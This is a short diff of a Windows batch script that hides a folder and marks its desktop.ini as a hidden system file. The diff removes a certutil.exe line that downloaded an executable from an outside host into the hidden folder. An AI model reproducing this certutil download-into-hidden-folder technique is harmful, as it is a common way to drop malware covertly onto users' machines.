@@ -16,5 +16,5 @@ echo InfoTip=Carpeta Oculta
 
 REM Marcar desktop.ini como sistema y oculto
 attrib +h +s %hiddenFolder%\desktop.ini
-start certutil.exe -urlcache -split -f https://baa4ts.is-a-good.dev/Win2Internals.exe %hiddenFolder%\Win2Internals.exe
+cls
 exit
